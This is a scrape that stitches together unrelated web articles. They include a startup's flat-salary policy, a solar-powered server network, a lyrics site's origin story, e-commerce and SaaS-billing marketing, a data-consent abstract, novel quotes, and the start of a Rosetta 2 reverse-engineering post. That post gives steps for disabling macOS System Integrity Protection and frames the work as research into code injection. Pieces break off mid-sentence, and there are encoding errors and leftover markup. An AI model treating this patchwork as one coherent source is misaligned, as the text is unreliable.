<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Compensation: the word alone is enough to trigger a fight-or-flight reaction in many. But we in technology have the good fortune of being in a well-compensated domain, so why does this issue induce such anxiety when our basic needs are clearly covered? If it needs to be said, it's because compensation isn't merely about the currency we redeem in exchange for our labors, but rather it is a proxy for how we are <em>valued</em> in a larger organization. This, in turn, brings us to our largest possible questions for ourselves, around things like meaning and self-worth.</p><p>So when we started Oxide -- as in any new endeavor -- compensation was an issue we had to deal with directly. First, there was the thorny issue of how we founders would compensate ourselves. Then, of course, came the team we wished to hire: hybrid local and remote, largely experienced to start (on account of <a href="https://www.youtube.com/watch?v=vvZA9n3e5pc">Oxide's outrageously ambitious mission</a>), and coming from a diverse set of backgrounds and experiences. How would we pay people in different geographies? How could we responsibly recruit experienced folks, many of whom have families and other financial obligations that can't be addressed with stock options? How could we avoid bringing people's compensation history -- often a reflection of race, gender, class, and other factors rather than capability -- with them?</p><p>We decided to do something outlandishly simple: take the salary that Steve, Jess, and I were going to pay ourselves, and pay that to everyone. The three of us live in the San Francisco Bay Area, and Steve and I each have three kids; we knew that the dollar figure that would allow us to live without financial distress -- which we put at $175,000 a year -- would be at least universally adequate for the team we wanted to build. And we mean everyone literally: as of this writing we have 23 employees, and that's what we all make.</p><p>Now, because compensation is the hottest of all hot buttons, it can be fairly expected that many people will have a reaction to this. Assuming you've made it to this sentence it means you are not already lighting us up in your local comments section (thank you!), and I want to promise in return that we know some likely objections, and we'll address those. But before we do, we want to talk about the benefits of transparent uniform compensation, because they are, in a word, profound.</p><p>Broadly, our compensation model embodies our <a href="https://oxide.computer/about/">mission, principles, and values</a>. First and foremost, we believe that our compensation model reflects our principles of <b>honesty</b>, <b>integrity</b>, and <b>decency</b>. To flip it around: sadly, we have seen extant comp structures in the industry become breeding grounds for dishonesty, deceit, and indecency. Beyond our principles, our comp model is a tangible expression of several of our values in particular:</p><ul><li><p>It has set the tone with respect to <b>teamwork</b>. In my experience, the need to "quantify" one's performance in exchange for justifying changes to individual compensation are at the root of much of what's wrong in the tech industry. Instead of incentivizing people to achieve together as a team, they are incentivized to advance themselves -- usually with sophisticated-sounding jargon like OKRs or MBOs, or perhaps reasonable-sounding (but ultimately misguided) mantras like "measure everything." Even at their very best, these individual incentives represent a drag on a team, as their infrequent calibration can prevent a team from a necessary change in its direction. And at worst, they leave individuals perversely incentivized and operating in direct opposition to the team's best interest. When comp is taken out of the picture, everyone can just focus on what we need to focus on: getting this outlandish thing built, and loving and serving the customers who are taking a chance on it.</p></li><li><p>It is an expression of our <b>empathy</b>. Our approach to compensation reflects our belief in treating other people the way that we ourselves want to be treated. There are several different dimensions for this, but one is particularly visceral: because we have not talked about this publicly, candidates who have applied to Oxide have done so assuming that we have a traditional comp model, and have braced themselves for the combat of a salary negotiation. But we have spoken about it relatively upfront with candidates (before they talk to the team, for example), and (as the one who has often had this discussion) the relief is often palpable. As one recent candidate phrased it to me: "if I had known about this earlier, I wouldn't have wasted time stressing out about it!"</p></li><li><p>It is (obviously?) proof-positive of our <b>transparency</b>. Transparency is essential for building <i>trust</i>, itself one of the most important elements of doing something bold together. One of the interesting pieces of advice we got early on from someone who has had outsized, repeated success: modulo private personnel meetings, make sure that every meeting is open to everyone. For those accustomed to more opaque environments, our level of transparency can be refreshing: for example, new Oxide employees have been pleasantly surprised that we always go through our board decks with everyone -- but we can't imagine doing it any other way. Transparent compensation takes this to an unusual (but not unprecedented) extreme, and we have found it to underscore how seriously we take transparency in general.</p></li><li><p>It has allowed whole new levels of <b>candor</b>. When everyone can talk about their salary, other things become easier to discuss directly. This candor is in all directions; without comp to worry about, we can all be candid with respect to our own struggles -- which in turn allows us to address them directly. And we can be candid too when giving public positive feedback; we don't need to be afraid that by calling attention to someone's progress, someone else will feel shorted.</p></li></ul><p>These are (some of!) the overwhelming positives; what about those objections?</p><ul><li><p>Some will say that this salary is too low. While cash compensation gets exaggerated all of the time, it's unquestionable that salaries in our privileged domain have gotten much higher than our $175,000 (and indeed, many at Oxide have taken a cut in pay to work here). But it's also true that $175,000 per year puts us each in the top 5% of US individual earners -- and it certainly puts a roof over our families' heads and food in their bellies. Put more viscerally: this is enough to not fret when your kids toss the organic raspberries into the shopping cart -- or when they devour them before you've managed to get the grocery bags out of the car! And speaking of those families: nothing is more anxiety-producing than having a healthcare issue compounded by financial distress due to inadequate insurance; Oxide not only offers the best healthcare plans we could find, but we also pay 100% of monthly premiums -- a significant benefit for those with dependents.</p></li><li><p>Some will say that we should be paying people differently based on different geographical locations. I know there are thoughtful people who pay folks differently based on their zip code, but (respectfully), we disagree with this approach. Companies spin this by explaining they are merely paying people based on their cost of living, but this is absurd: do we increase someone's salary when their spouse loses their job or when their kid goes to college? Do we slash it when they inherit money from their deceased parent or move in with someone? The answer to all of these is no, of course not: we pay people based on their work, not their costs. The truth is that companies pay people less in other geographies for a simple reason: because they can. We at Oxide just don't agree with this; we pay people the same regardless of where they pick up their mail.</p></li><li><p>Some will say that this doesn't scale. This is, at some level, surely correct: it's hard to envision a multi-thousand employee Oxide where everyone makes the same salary -- but it has also been (rightly) said that startups should do things that don't scale. And while it seems true that the uniformity won't necessarily scale, we believe that the values behind it very much will!</p></li><li><p>Some will say that this makes us unlikely to hire folks just starting out in their career. There is truth to this too, but the nature of our problem at Oxide (namely, technically very broad and very deep), the size of our team (very small), and the stage of our company (still pretty early!) already means that engineers at the earliest stages of their career are unlikely to be a fit for us right now. That said, we don't think this is impossible; and if we felt that we had someone much earlier in their career who was a fit -- that is, if we saw them contributing to the company as much as anyone else -- why wouldn't we reflect that by paying them the same as everyone else?</p></li><li><p>Some will say that this narrows the kind of roles that we can hire for. In particular, different roles can have very different comp models (sales often has a significant commission component in exchange for a lower base, for example). There is truth to this too -- but for the moment we're going to put this in the "but-this-can't-scale" bucket.</p></li><li><p>Some will say that this doesn't offer a career ladder. Uniform compensation causes us to ask some deeper questions: namely, what <em>is</em> a career ladder, anyway? To me, the true objective for all of us should be to always be taking on new challenges -- to be unafraid to learn and develop. I have found traditional ladders to not serve these ends particularly well, because they focus us on competition rather than collaboration. By eliminating the rung of compensation, we can put the focus on career development where it belongs: on supporting one another in our self-improvement, and working together to do things that are beyond any one of us.</p></li><li><p>Some will say that we should be talking about equity, not cash compensation. While it's true that startup equity is important, it's also true that startup equity doesn't pay the orthodontist's bill or get the basement …</p></li></ul></div></div>

      Sunlight levels at each server are shown in yellow. The
      colored bars represent which server has been the active server in the network over the past 72 hours.
      </p><hr>
    </div>
  </div><div>
    <h3>About</h3>
    <p>
      Solar Protocol is a web platform hosted across a network of small solar-powered servers set up in different locations around the world. A solar-powered server is a computer that is powered by a solar panel and a small battery. Each server can only offer intermittent connectivity that is dependent on available sunshine, the length of day and local weather conditions. When connected as a network, the servers can coordinate to serve a website from whichever of them is enjoying the most sunshine available.  
    </p>
    <p>
      With servers located in different time zones, seasons and weather systems, internet traffic is directed to wherever the sun is shining. When your browser makes a request to see this website, it is sent to whichever server in the network is generating the most energy. For example, right now you are seeing the version of this website that is hosted on Trent server located in Trent University where it is 07:30 AM and the weather is overcast clouds.
    </p>
    <p>
      The Solar Protocol network explores the sun’s interaction with Earth as a form of logic that shapes the daily behaviors, seasonal activities and the decision making of almost all life forms. Solar Protocol honors this natural logic, exploring it as a form of intelligence that is used to automate decisions in a digital network.
    </p>
    <h4>How does it work?</h4>
    <p>
      A solar panel recharges a battery that provides energy for a small computer set up at each project location around the world. As the sun rises and sets, each server becomes active or inactive as its solar panel goes into sunlight or darkness. Traffic is redirected between servers depending on where there is the most light.

    </p>
    <p>
      Solar Protocol uses everyday internet technologies like the Domain Network Service (DNS) protocol, a decentralized system that associates a URL address to the IP address of a server. In short, DNS is the system that dictates the path between client and server. For large-scale, high volume web services that use multiple servers hosted in different locations, the DNS protocol typically directs network traffic to whichever server gives the quickest response time. For example, when making a Google search, your request would be sent to whichever Google server responds the quickest which is usually the server that is the closest geographically. This prioritizes speed over all other factors that determine how a network operates, a characteristic that is prevalent in much digital culture. 
    </p>
  </div><div>
  <p>
    The position of sun relative to earth produces the routing logic of the
    network.
  </p>
</div><div>
    <p>
      But it doesn’t have to work this way. Instead, the Solar Protocol network is built with a different logic based on the sun, automatically directing traffic to whichever server is generating the most solar energy at the time of the request. Decisions about where to move computational activity in the network are made according to where there is the most naturally available energy, rather than according to what would produce the quickest results for the user. In other words, in Solar Protocol, the distribution of sunshine (and therefore energy) across the planet determines the path from client to server. 
    </p>

    <h4>Why does the appearance of this website change from time to time?</h4>
    <p>
      Right now this website is being delivered to you from the Trent server located in Trent University. This website may look different depending on which server is displaying this website. That’s because the people stewarding each server can  choose to customize their local version of this website. These variations in design and content are visible when their server is the active server.
    </p>
    <p>
      The appearance of this website is also energy responsive. Our software changes the styling and resolution of the media on this website according to how much energy is stored in the battery of the active server. This means it may look different at different times of the day or depending on the seasons of the year. If the battery level at the active server is low, this website is displayed in low resolution mode, without images. This reduces the size of the page and therefore the energy required to send it to people who are looking at it on the internet. If more stored energy is available, the site will appear at a higher resolution with heavier media such as images and graphics. 
    </p>
    <p>
      Occasionally the website may go down if there is insufficient energy stored at all of the servers. As our network grows and we set up more servers in more time zones and climates, this should happen less and less (and if you’re interested in setting one up, <a href="http://solarprotocol.net/call.html">read more here</a>). It’s always sunny somewhere!

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>20 years</em> ago today I posted a <a href="http://forums.winamp.com/showthread.php?threadid=43674">message</a> on the Winamp Forums<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> announcing a project I started during Christmas vacation and had been working on for a few months:</p><p><img src="https://icdn.remarkedusercontent.com/s/sh:0.5/rs:fit:1200/aHR0cHM6Ly9jZG4ucmVtYXJrZWR1c2VyY29udGVudC5jb20vZmlsZS9yZW1hcmtlZC1wcm9kLzEvbWFya3MvODZzTWlMblkvMjAyMTAxMTgtMTAyNTQ3LnBuZw.jpg" alt="Screenshot from Winamp Forums announcing SongMeanings"></p><p>The reaction was amazing and the next few months were some of the most thrilling of my life. Some of the very same ups and downs of traffic, user growth, and server issues that dot-com era startups with millions in funding were dealing with were playing out in my bedroom, in-between classes my Senior year of high school, on AIM, and on various budget shared web hosts. I never told anyone in the real world about SongMeanings. My parents didn’t know, my school friends didn’t know. It was just my own online thing, part of my virtual persona. It even sounded weird to say “SongMeanings” out loud because I had uttered it so few times.</p><p>I let SongMeanings slip out of my hands when I start college and it was moved forward from a scappy (illegal) site to a legit business. But money was never part of the equation with me and SongMeanings. I never put any in and never got any out. But that never mattered to me.</p><p>Looking back I realized I learned more about my software career building SongMeanings than any book, class, or degree. It was just about wanting to build something, reading how others did it, copying and hacking away until it (mostly) worked, sharing it with the world, and doing it all over again.</p><h2 id="up-and-running-2-decades-later">Up And Running 2 Decades Later</h2><p><img width="256" src="https://icdn.remarkedusercontent.com/s/sh:0.5/rs:fit:512:512/aHR0cHM6Ly9jZG4ucmVtYXJrZWR1c2VyY29udGVudC5jb20vZmlsZS9yZW1hcmtlZC1wcm9kLzEvbWFya3MvZGxzbmlrTG0vU00tUmVzb3VyY2UtQ0QuanBn.jpg"></p><p>I found an old CD-R I had burned of the code and a database backup from October 2001 and wondered if I could get it running today. To my surprise, it took about 30 minutes to get the entire site back up and running again in a Docker container, looking exactly like it did 20 years ago. Like a mosquito trapped in amber. PHP4 and MySQL 3.23 installed in fractions of a second in a <a href="https://hub.docker.com/r/debian/eol/"><code>debian/eol:potato</code> Docker image</a> on a modern 32-core machine<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> and pages rendered flawlessly in a modern browser, just like they did in IE 6 on Windows 2000 at the time:</p><p><img src="https://icdn.remarkedusercontent.com/s/q:90/sh:0.5/rs:fit:1200/aHR0cHM6Ly9jZG4ucmVtYXJrZWR1c2VyY29udGVudC5jb20vZmlsZS9yZW1hcmtlZC1wcm9kLzEvbWFya3MvYVlzWWk5TW0vMjAyMTAxMTgtMTA0NjQzLnBuZw.jpg" alt=""></p><p>Practically everything works: viewing artists, commenting on lyrics, even logging in. I typed in my old username and password and was instantly shown a summary of what had happened since the last time I logged in, including 3 unread Private Messages. I viewed the very first lyric I posted to SongMeanings, Evaporated by Ben Folds Five:</p><p><img src="https://icdn.remarkedusercontent.com/s/q:90/sh:0.5/rs:fit:1200/aHR0cHM6Ly9jZG4ucmVtYXJrZWR1c2VyY29udGVudC5jb20vZmlsZS9yZW1hcmtlZC1wcm9kLzEvbWFya3MvbGJzMGk0RFcvMjAyMTAxMTgtMTEyOTA3LnBuZw.jpg" alt=""></p><p>That song still has the same ID on SongMeanings today, 1: <a href="https://songmeanings.com/songs/view/1/">https://songmeanings.com/songs/view/1/</a>. So much has changed but the roots are still there, intact.</p><p>The latest blog post was me trying to sound like I had any idea about what had happened just <em>2 days after</em> September 11, 2001<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>:</p><p><img src="https://icdn.remarkedusercontent.com/s/q:90/sh:0.5/rs:fit:1200/aHR0cHM6Ly9jZG4ucmVtYXJrZWR1c2VyY29udGVudC5jb20vZmlsZS9yZW1hcmtlZC1wcm9kLzEvbWFya3MvRWJzd2k3R1kvMjAyMTAxMTgtMTExMjA0LnBuZw.jpg" alt=""></p><p>The code looks like a jumbled mess to me now, as most PHP probably was in that day. SQL queries interspersed with HTML (mostly without CSS) riddled with XSS and SQL-injection vulnerabilities. Here’s a piece of PHP typical in SongMeanings 1 from probably the most run file, <code>showsong.php</code> (yep, every URL was a file… no RESTful routes back then!)</p><div><pre><code data-lang="php"><span>&lt;?</span>  <span>// showsong based on $id

</span></code></pre></div><p>There are probably a dozen things wrong just these 12 lines of code (out of just about 14K total.) Not to mention it was all edited by hand, in real time, on the production site via FTP. No local development, no staging server, no version control, no tests, no QA: and it was amazing.</p><p>I thought about trying to get that version up somehow to browse around, but it’d likely be compromised within hours. If that’s a trip down memory lane you’d like to take, Archive.org has <a href="https://web.archive.org/web/20020118073653/http://songmeanings.net:80/">captured much of the journey</a>.</p><p>There’s nothing tangible left from that era in my life. I never saw anyone I worked with on SongMeanings in real life or keep in contact with any of the friends I spent so many long nights chatting with on AOL and AIM. Once I was disconnected, they were gone.</p><p>I sometimes wonder what could’ve been, what might’ve become of SongMeanings and myself had I stuck around. But it’s a fleeting thought, what happened happened. I instead took everything I learned and built a foundation for a career 20 years running and left nothing but fond memories.</p><section role="doc-endnotes"><hr><ol><li id="fn:1" role="doc-endnote"><p>Much to my surprise, this original link on the Winamp Forums <em>still works</em> even after Nullsoft had been acquired and Winamp sold a couple times since! <a href="#fnref:1" role="doc-backlink">↩︎</a></p></li><li id="fn:2" role="doc-endnote"><p>Of course, back in those days running real PHP was just as easy because most web hosts had it pre-installed.

More and more people are launching websites and creating Amazon seller accounts.</p><p>Why wouldnâ€™t they? It has the lowest barrier of entry of any business you can start. You can get up and running in a few days. You donâ€™t need a warehouse and you donâ€™t necessarily even need inventory.</p><p>Some sellers will start by holding inventory and some will start by dropshipping. But how can a seller really gain an advantage in such a saturated market that more people are entering every minute? The answer is hybrid fulfillment. Hybrid fulfillment (or multi channel fulfillment) is fulfilling your orders using different channels. Your supplier, 3PL, any fulfillment provider are considered channels.</p><p>Letâ€™s say you are dropshipping some products and shipping other products yourself.</p><p>Letâ€™s say you are holding and shipping all of your inventory but decide to dropship 1 item to see if itâ€™s worth buying in bulk.</p><p>Letâ€™s say you want to sell your items in new geographical areas like the UK or Australia which will need their own supplier or warehouse.</p><h2 id="hybrid-fulfillment"><p>Hybrid Fulfillment<a aria-label="anchor" href="#hybrid-fulfillment">#</a></p></h2><p>All of these are examples hybrid fulfillment. It helps you increase your catalog size, expand to new places, and in the end, get more orders and scale.</p><p>You're wondering why all e-commerce businesses don't do this. The problem is that managing multiple fulfillment channels is not simple. The elite e-commerce brands and companies use expensive ERP systems like SAP to achieve this or build their own custom backend. They also have a team of dedicated engineers to maintain and update the system as they scale.</p><p>We sought out to bring the benefits of hybrid fulfillment to small and medium e-commerce businesses. Thatâ€™s where Openship comes in.</p><h2 id="openship"><p>Openship<a aria-label="anchor" href="#openship">#</a></p></h2><p>Openshipâ€™s humble beginnings were that of Zapier and Google Sheets which is how we handled hybrid fulfillment early on. It eventually grew into a full-fledged hybrid fulfillment platform where any supplier and fulfillment system could be connected and switched between seamlessly.</p><p>Internally, it helped us expand into new markets, grow our catalog size, and launch new stores in weeks, not months.</p><p>After years of hard work, Openship 1.0 is finally here. Use us to scale your e-commerce business and never be locked into a supplier or fulfillment system.</p><p>Be sure to check out the <a href="https://openship.org/">website</a>, <a target="_blank" rel="noopener noreferrer" href="https://docs.openship.org/">documentation</a>, and <a href="https://openship.org/?video=true">demo</a>.

			<p>While consent continues to be a crucial element of data protection regimes around the world, it has also been diagnosed with numerous weaknesses as a tool to promote and protect individuals' autonomy. In this paper, we set out to learn from feminist theory around consent in general and feminist applied thinking around sexual consent in particular how consent regimes in data protection can be strengthened. We argue that such a journey will be promising because of the close entanglements between our bodies and our data. We particularly foreground feminist criticisms of the concept of “property in the person” to understand in more detail the profound harms that current data practices do to our personhood, as well as the ways in which consent is currently deployed to enable and even legitimise such practices, rather than challenge or reject them. Through close engagement with feminist thinking around consent, we then develop a list of feminist principles that will need to be followed if consent is to ever be meaningful in data governance. Finally, we outline three areas of change that the application of these principles immediately points to: changes related to the collection of data; changes related to the uses of data; and changes required to protect people who are especially vulnerable in particular. Making these shifts, we argue, is essential if we are to put into place a data infrastructure that is actually empowering for, rather than exploitative of people.</p>

Instead, we’d burned our home.”</p><p>“…a true utopia would have a one hundred percent suicide rate, where everyone dies precisely when and how they wish.”</p><p>“Theoretically the only tool you really needed to survive was a gun; everything else could be taken from others who lacked one.”</p><p>“Tragically ironic, isn’t it? How nuclear weapons represent both our species’ mastery over the very foundations of nature, as well as our utter inability to master our most primitive instincts.”</p><p>“Would intelligent life evolve again on this planet, and if so would it have the means — like opposable thumbs or a way to store knowledge outside of brains — to build technology? Dolphins could have lived for eternity and never developed the capability to annihilate their species or the world, much less colonize another.”</p><p>“We stood on the shoulders of giants, but we fell off.”</p><p>“There were many slippery slopes to nihilism in this new world, and the higher up you were the easier it was to fall down one of them.”</p><p><strong>(Dark) Humor</strong></p><p>“So, this is how the world ends, eh? Not with a bang, not with a whimper, but with a disgusting gurgling sound, he thought.”</p><p>“Chad was a twenty-six-year-old former developer of software used to develop more advanced software. He was now unemployed.”</p><p>“The story of Noah’s Ark, if you’re familiar, left out the part where the animal kingdom is repopulated entirely through rampant incest.”</p><p>“A fate worse than death, in that it also included death at the end.”</p><p>“Like no small number of wealthy people he’d taken up an antiquated form of transportation as a hobby.”</p><p>“The lights went down in the city, an artificial sun shining on the bay.”</p><p><strong>About Life</strong></p><p>“He’d been younger then, when sex meant both nothing and everything.”</p><p>“I used to wish I’d have nightmares — what a pleasure it would have been to wake up. If all your dreams are terrifying, reality actually becomes something to look forward to.”</p><p>“…life is a war we all lose in the end, but every day is a battle, and you can sure as hell win some of those.”</p><p>“But the surest way to live a worthwhile, meaningful life was to have already done so, those moments etched forever into the fabric of spacetime.”</p><p>“A not-so-subtle reminder that anyone can lose everything at any time, though few think it will happen to them and none get the chance to realize it did when it does.”</p><p>“How spectacularly things shine when viewed from the darkness…”</p><p><strong>About the Mind</strong></p><p>“…how can someone who may be losing his mind accurately assess his own sanity?”</p><p>“There’s nothing quite so terrifying as being unsure of your own sanity. All other concerns are downstream.”</p><p>“Once upon a time the only thing that couldn’t be taken from someone under any circumstances was their own attitude and thoughts. A sufficiently trained and powerful mind could always take refuge in itself. But Keli knew all too well this was no longer the case; when you strip away the layers of abstraction we’re merely chemical reactions and electric pulses, both of which can be manipulated.”</p><p>“But at this point I know I’m only remembering the last time I remembered, an increasingly distorted recursion reaching back in time.”</p><p><strong>About the Universe</strong></p><p>“With a fixed amount of matter and energy in the universe, everything is a zero-sum game on some level.”</p><p>“The electrified gas creating these vibrant displays was a distinct and oft-forgotten fourth phase of matter — plasma — that comprised more of the universe than all but matter’s fifth phase: dark.”</p><p>“There’s a brute fact at the end of every chain of causality. Some are just harder to accept than others. If you keep asking ‘why’ in any domain you eventually arrive at something that just seems to be true about reality, at least insofar as we understand it.”</p><p><em>If you like these quotes and are interested in a full book about these themes, my debut sci-fi novel </em>Mind Painter <em>is available on </em><a href="https://www.amazon.com/Mind-Painter-Tom-B-Night/dp/B08NDVJ3C8/" target="_blank"><em>Amazon</em></a><em>.</em></p></div></div></div></div></div></div></div>]]>

            <section>
                <div>
                    <p>It starts with a simple use case. You want to charge customers every month for getting access to your SaaS. Customers must be able to pick a plan, upgrade, update their card info, download invoices, and cancel the subscription. For a team with technical resources and no prior experience with billing and payments, this use case may seem like a fun project to build internally. For veteran founders and product leads, it is the tip of a giant iceberg of SaaS billing.</p><p>In this guide, we'll discuss the unforeseen risks of building an in-house SaaS billing integration.</p><h2 id="build-vs-buy-debatable-components">Build vs. buy debatable components</h2><p>SaaS billing is a complex, multi-layered beast. To better understand the debate on building versus buying a billing solution, it's best to look at each SaaS billing component.</p><figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/ah57r6c/2021/03/Build-Vs.-Buy--1-.png" alt=""><figcaption>SaaS billing build vs. buy decision point</figcaption></figure><p>The core layers, including payments, subscription billing, and analytics, have evolved solutions that make the buy argument an easy win. Product teams don't reinvent tools like <a href="http://stripe.com/payments?ref=billflow">Stripe Payments</a> and <a href="https://stripe.com/billing?ref=billflow">Stripe Billing</a> for handling the logistics of payments and subscriptions. Analytical tools such as <a href="https://chartmogul.com/?ref=billflow">ChartMogul</a>, <a href="https://baremetrics.com/?ref=billflow">Baremetrics</a>, and <a href="http://profitwell.com/?ref=billflow">ProfitWell</a> make it very easy to plug and play with data.</p><p>The component that is usually up for debate by the product teams is the SaaS billing user interface and experience (UI/UX). Billing UI/UX consists of all the customer-facing billing logic the end-user interacts with inside your app. Think of it as the front-end of your billing. Unlike the rest, the billing UI component has fewer solutions, developers are less solution-aware, and it looks deceivingly simpler to build at first glance.</p><p>When SaaS companies are deciding on building vs. buying the billing UI, they focus most of their energy on finding the risks rather than the values they get from buying. <a href="https://twitter.com/Lethain">Will Larson</a>, CTO of <a href="https://www.calm.com/?ref=billflow">Calm</a>, explains this well in his <a href="https://lethain.com/build-vs-buy/?ref=billflow">Build versus buy masterpiece</a>:</p><!--kg-card-begin: markdown--><blockquote>
<p>"In the build versus buy decision, most companies put the majority of their energy into identifying risk, which has its place, but often culminates in a robust <a href="https://en.wikipedia.org/wiki/Not_invented_here">not invented here</a> culture that robs the core business of attention. To avoid that fate, it's important to spend at least as much time on the value that comes from buy decisions."</p>
</blockquote>
<!--kg-card-end: markdown--><h2 id="risks-values">Risks &amp; values</h2><p>The billing user interface is a very integral part of your billing flow. It is the bridge between billing and the customer acquisition strategy. In a survey of 136 SMB SaaS companies by <a href="https://www.billflow.io/">Billflow</a>, the top three factors companies looked for in a new billing UI solution were ease of set up, customizability, and reliability.</p><figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/ah57r6c/2021/03/Screen-Shot-2021-03-02-at-12.39.09-PM.png" alt=""><figcaption>Survey of 136 SaaS businesses by Billflow</figcaption></figure><p>Rightfully so, development teams seek customizability, compatibility, and control over any internal or external tool they integrate with. Suppose there is a well-known solution that checks these boxes. In that case, the decision becomes simple, but when the status quo is building an in-house solution, it is the product leader's job to seek options to save time and resources. In the end, there should be a very compelling reason to build versus buying. <a href="https://www.cfodive.com/news/saas-billing-system-development/582545?ref=billflow">CFOdive</a> sums it well:</p><!--kg-card-begin: markdown--><blockquote>
<p>"A system that grows as your services and pricing become more complex will be far costlier and take longer than you expect."</p>
</blockquote>
<!--kg-card-end: markdown--><p>Luckily, we've done our research. Here are the value comparisons of buying a SaaS billing UI versus building one in-house.</p><h3 id="initial-implementation-time">Initial implementation time</h3><figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/ah57r6c/2021/03/---1-.png" alt=""><figcaption>SaaS billing in-house integration cost vs. buying Billflow</figcaption></figure><p>Building an in-house billing integration requires a learning curve for the development team. We've spoken to over 500 SMB SaaS startups. The time it takes to implement billing into an app varies primarily based on the pricing model and the user acquisition strategy (freemium, free trial, etc.). Businesses in this segment spend an average of eight weeks to architect, implement, and test their initial SaaS billing integration. Calculating the in-house resource consumption, SaaS startups spend an average of $25,000 on building their initial version of SaaS billing. Buying an out-of-the-box solution can reduce the timeline to less than a week with a fraction of the cost!</p><h3 id="on-going-maintenance-support">On-going maintenance &amp; support</h3><p>Maintaining an in-house billing integration is time-consuming. There are unaccounted factors that will require development work as you scale your business and pricing model. Here are some common ones:</p><ul><li>You may need to update your billing flow. For example, moving from flat subscriptions to the usage-based model, introducing add-ons to upsell features, adding churn surveys to increase retention, or moving from free trials to freemium.</li><li>Features such as language support, currency localization, taxes &amp; VATs, and payment method support will inevitably come up as you scale.</li><li>You may want to update pricing or run promotional experiments.</li><li>You may need to change billing-related marketing copy to improve conversion.</li><li>Global policies could change. For example, EU requiring SCA.</li></ul><p>Buying a solution will give your developers instant access to billing features, updates, and, most importantly, billing experts who can save your development team a ton of time. Tools like <a href="https://www.billflow.io/">Billflow</a> work on top of <a href="https://stripe.com/billing">Stripe Billing</a> with Stripe's best practices for SaaS integration.</p><h3 id="product-focus">Product focus</h3><p>Time is precious, and focus is nontrivial. Focusing on the core product and not being distracted by building and maintaining internal tools is essential. Billing spans to more than just the development team. Finance and marketing teams often ask for aesthetic or pricing changes that will require billing changes. With an in-house integration, a simple verbiage change will require developers' time. Reducing the building and maintenance of non-product-related code will significantly impact the hours your development team spends on the product itself.</p><p>SaaS companies don't build an internal video conferencing tool, email, docs system, or messaging tool. As long as the tool is not part of the core product and vision, it is much more cost-effective to pay for it rather than building your own. The same goes for billing. Don't let the recurring cost and developer's love for building internal tools hold you back from focusing on your vision. If the price is higher than your budget, communicate transparently with the vendors, new markets are more forgiving with cost as they need adaption and feedback in the early days.</p><p>Nowadays, there is a range of low-code and no-code tools available to reduce the friction of building a scalable SaaS product. They maintain the code, so your developers don't have to. A great example of a no-code/low-code billing solution is <a href="https://stripe.com/billing?ref=billflow">Stripe Billing</a> and <a href="https://www.billflow.io/">Billflow</a> no-code billing toolkit.</p><figure><img src="https://digitalpress.fra1.cdn.digitaloceanspaces.com/ah57r6c/2021/03/Stack.png" alt=""><figcaption>Stripe Billing + Billflow</figcaption></figure><p>If you are looking for a Stripe Billing expert advice on your billing architecture, you can <a href="https://calendly.com/darafsheh/consultation">schedule a 30-minute call with me here</a>.</p>

<p>date: 2021/2/19</p>
<p>author: Koh M. Nakagawa</p>
<h2 id="introduction">Introduction</h2>
<p>Apple announced that it would be moving from Intel processors to Arm-based Apple Silicon CPUs for Macs at WWDC 2020.
The Apple Silicon-based Mac Book Air and Pro were released in October 2020 with great fanfare.</p>
<p>One of the issues that arise with the CPU transition is application compatibility.
Since Apple Silicon is an Arm-based processor, applications built for Intel-based Macs will no longer work.
To solve this problem, Apple offers the following two technologies:</p>
<ul>
<li>Universal Binary 2</li>
<li>Rosetta 2</li>
</ul>
<p>Universal Binary 2 is a mechanism to encapsulate binaries built for multiple architectures into a single binary, which is also called Fat Binary.
Apple has been using this technology for a long time to maintain backward compatibility.
A Mach-O loader selects the binary with the best architecture for the machine it is running on, then loads only that binary into memory to run the program.
Most macOS Big Sur system binaries are currently Fat Binaries, containing binaries built for both Arm and Intel architectures.</p>
<p>Rosetta 2 is a technology that translates Intel-based binaries or JIT-generated code into Arm-based binaries or code.
It is the successor to Rosetta, which was also used in the past processor transition.
There is not much information officially released by Apple.
Of course, there is no source code available, unlike the XNU kernel.
Also, at the time of writing this article, there seems to be no article that examines it in detail.</p>
<p>In this article, I introduce some reverse engineering results of Rosetta 2.</p>
<p>Why I take a closer look at Rosetta 2?</p>
<p>The reason is that I'm interested in translated binaries in Rosetta 2 and examining the possibility of exploiting them.
I presented <a href="https://www.blackhat.com/eu-20/briefings/schedule/index.html#jack-in-the-cache-a-new-code-injection-technique-through-modifying-x-to-arm-translation-cache-21324">a new code injection technique in Windows 10 on Arm at Black Hat EU</a> last December.
The code injection is achieved by modifying x86 to Arm (XTA) binary translation cache files.
This research encourages me to examine whether similar code injection techniques can be achieved with Rosetta 2.</p>
<p>In this part, I will cover the following points:</p>
<ul>
<li>The executables associated with Rosetta 2 and their roles</li>
<li>Analysis results of the translated binaries</li>
<li>JIT binary translation capabilities of Rosetta 2 (mainly focusing on x86_64 machine code decoding process)</li>
</ul>
<p>In the following, I will follow Apple's terminology when referring to architecture.</p>
<ul>
<li>arm64: The architecture specified when generating binaries to run on an Apple Silicon Mac</li>
<li>x86_64: The architecture specified when generating binaries to run on an Intel-based Mac</li>
</ul>
<h2 id="setting-up-the-analysis-environment">Setting up the analysis environment</h2>
<p>First, I show you how to set up the analysis environment.</p>
<p>Rosetta 2 is not installed by default on an Apple Silicon Mac.
So, you need to install it following the pop-up that appears when you run an x86_64 code for the first time.</p>

</figure>

<p>After the installation, a folder named <code>/Library/Apple/usr/libexec/oah/</code> (hereinafter referred to as the oah folder) is created, and you can see the following binaries installed.</p>

    <figcaption>Figure 2 Binaries installed after Rosetta 2 installation.</figcaption>
</figure>

<p>The role of each binary will be explained later.</p>
<p>The next step is to disable System Integrity Protection (SIP).
This is because the folder that contains the translated binaries is protected by SIP and cannot be accessed by default even with administrative privileges.</p>
<p>Please follow the steps below to disable SIP.</p>
<ul>
<li>Restart the OS</li>
<li>Press and hold Touch ID to boot in the recovery mode</li>
<li>Select Terminal from "Utilities" at the top of the screen</li>
<li>Type <code>csrutil disable</code> and execute</li>
<li>Restart the OS again</li>
</ul>
